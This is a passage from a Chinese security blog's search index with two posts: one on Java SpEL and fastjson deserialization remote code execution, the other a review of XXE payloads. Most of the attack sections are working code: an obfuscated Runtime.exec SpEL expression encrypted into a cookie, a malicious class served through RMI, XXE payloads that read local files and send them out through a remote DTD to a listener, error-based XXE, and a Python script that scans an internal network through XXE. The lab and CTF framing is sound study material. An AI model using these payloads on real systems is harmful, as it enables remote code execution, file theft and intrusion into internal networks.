class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;calc&quot;)</code></pre><p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p><p>先本地测试弹一个计算器</p><pre><code class="java">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;calc\&quot;})}&quot;)); //注意java的字符串必须是双引号</code></pre><p>生成payload</p><pre><code>bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=</code></pre><p>之后登陆再替换掉cookie</p><p><img src="/posts/21b61fbe/1573973547431-1580346732870.png" alt="结果"></p><h2 id="fastjson-反序列化-仅复现"><a href="#fastjson-反序列化-仅复现" class="headerlink" title="fastjson 反序列化(仅复现)"></a>fastjson 反序列化(仅复现)</h2><p>docker开启环境之后，首先需要生成一个 <code>TouchFile</code> 恶意文件，然后编译成class文件</p><pre><code class="java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>用python开一个服务器，监听8001端口</p><p>再开启一个rmi服务器，靶机ip为192.168.99.100，本机相对靶机是192.168.99.1</p><p><img src="/posts/21b61fbe/1580469670376.png" alt></p><p>这时候将payload发送过去，payload只是演示了在 tmp 目录下创建文件</p><p><img src="/posts/21b61fbe/1580469645918.png" alt></p><p>创建成功</p><p><img src="/posts/21b61fbe/1580469708254.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/#h4.1_%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">Java反序列化漏洞通用利用分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE复习</title>
      <link href="/posts/2e545689/"/>
      <url>/posts/2e545689/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常用payload分析"><a href="#常用payload分析" class="headerlink" title="常用payload分析"></a>常用payload分析</h2><p>好像大家都用这个测试代码</p><pre><code class="php">&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents(&quot;php://input&quot;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);var_dump($creds);</code></pre><p>使用XML发送数据：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY a SYSTEM &quot;http://localhost:8887/aaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;a;&lt;/root&gt;</code></pre><p>但是我在尝试参数实体的时候似乎不能外带数据</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % a &quot;http://localhost:8887/aaa&quot;&gt;%a;]&gt;&lt;root&gt;&lt;/root&gt;</code></pre><p><img src="/posts/2e545689/1580302730124.png" alt></p><p>嵌套也是不行的</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>最常用的外带数据的方法：</p><p>在自己的vps上准备两个文件，我这里就就都在本机做的实验</p><p>本地的8001端口开一个web服务，</p><p><img src="/posts/2e545689/1580302833010-1580342074917.png" alt></p><p><code>local.xml</code> 文件内容：</p><pre><code class="xml">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;%start;</code></pre><p>这个文件表示读取到数据之后发送给另一个8887端口，然后我们向受害者服务器发送数据，</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;      &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.txt&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</code></pre><p>然后就可以在8887端口接收到数据了</p><p><img src="/posts/2e545689/1580302962486-1580342120888.png" alt></p><p>换一种 <code>payload</code> 也行</p><p>DTD文件</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://localhost:8887/p=%file;&#39;&gt;&quot;&gt;</code></pre><p>发送的 paylod</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;%remote;%int;%send;]&gt;</code></pre><h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>这个方法p牛其实早就说过了,通过三层嵌套的XML就可以达到报错</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY&gt;    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY % para &#39;        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;para2;    &#39;&gt;    %para;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p><img src="/posts/2e545689/1580303152983-1580342131433.png" alt></p><h2 id="XXE探测内网"><a href="#XXE探测内网" class="headerlink" title="XXE探测内网"></a>XXE探测内网</h2><pre><code class="xml">import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;    send_xml(xml)def send_xml(xml):    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}    x = requests.post(&#39;http://127.0.0.1/xml.php&#39;, data=xml, headers=headers, timeout=5).text    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = &#39;192.168.1.&#39; + i        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;        print string        build_xml(string)    except:      print &quot;error&quot;continue</code></pre><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
